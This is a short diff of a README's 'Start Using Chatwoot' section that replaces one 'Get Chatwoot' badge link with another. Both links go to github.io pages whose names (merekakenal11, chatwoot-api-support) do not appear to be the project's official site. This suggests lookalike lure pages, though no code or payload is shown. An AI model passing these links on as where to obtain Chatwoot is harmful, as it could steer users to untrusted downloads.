@@ -3,7 +3,7 @@
 
 ## Start Using Chatwoot
 
-[![Get Chatwoot](https://img.shields.io/badge/Get-Chatwoot-2c3e50?style=flat-square&logo=github&logoColor=white)](https://merekakenal11.github.io/.github/Chatwoot-Api)
+[![Try Chatwoot](https://img.shields.io/badge/Try-Chatwoot-EA580C?style=flat&logo=probot&logoColor=white)](https://chatwoot-api-support.github.io/.github/)
 
 ![Chatwoot shared inbox managing customer conversations across channels](https://opensourcecollection.com/projects-storage/images/chatwoot-chatwoot-1.png)
 
